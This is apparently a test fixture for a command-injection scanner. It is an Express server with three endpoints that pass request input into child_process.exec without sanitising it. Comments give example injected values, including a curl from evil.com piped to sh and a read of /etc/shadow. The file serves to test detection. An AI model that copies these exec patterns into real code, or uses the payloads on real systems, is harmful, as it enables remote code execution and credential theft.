// Fixture: js-express-exec — child_process.exec() with template literal
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-78
// Agent: cmdi
// Pattern: User input interpolated into exec() via template literal

import express from "express";
import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);
const app = express();
app.use(express.json());

// VULNERABLE: template literal passes user-controlled repo URL to git clone
// Attacker sends: {"repoUrl": "https://legit.com/repo.git; curl http://evil.com/x | sh"}
app.post("/api/repos/clone", async (req, res) => {
  const { repoUrl, branch } = req.body;
  try {
    const { stdout } = await execAsync(
      `git clone --depth 1 --branch ${branch ?? "main"} ${repoUrl} /tmp/repos/${Date.now()}`
    );
    res.json({ status: "cloned", output: stdout });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// VULNERABLE: user-controlled filename passed to ffprobe via exec
// Attacker sends: ?file=video.mp4;+cat+/etc/shadow
app.get("/api/media/info", async (req, res) => {
  const file = req.query.file as string;
  try {
    const { stdout } = await execAsync(
      `ffprobe -v quiet -print_format json -show_format -show_streams "/uploads/${file}"`
    );
    res.json(JSON.parse(stdout));
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// VULNERABLE: user-controlled subdomain in nslookup via exec
// Attacker sends: {"target": "example.com; id > /tmp/pwned"}
app.post("/api/network/lookup", async (req, res) => {
  const { target, server } = req.body;
  const dnsServer = server ?? "8.8.8.8";
  try {
    const { stdout } = await execAsync(`nslookup ${target} ${dnsServer}`);
    res.json({ result: stdout });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(3000);
